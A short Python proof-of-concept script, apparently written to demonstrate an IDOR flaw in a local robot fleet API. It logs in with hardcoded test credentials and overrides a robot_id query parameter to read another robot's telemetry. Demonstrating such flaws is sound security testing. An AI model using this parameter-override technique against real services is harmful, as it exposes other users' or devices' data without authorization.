"""PoC: IDOR — read another robot's telemetry via query param override."""

import httpx

URL = "http://localhost:8000/v1/robots/robot-beta/telemetry"


def main() -> None:
    login = httpx.post(
        "http://localhost:8000/v1/auth/token",
        json={"username": "operator", "password": "operator123!"},
    )
    token = login.json()["access_token"]
    resp = httpx.get(URL, params={"robot_id": "robot-alpha"}, headers={"Authorization": f"Bearer {token}"})
    print(f"Status: {resp.status_code}")
    print(f"Records: {len(resp.json())}")


if __name__ == "__main__":
    main()
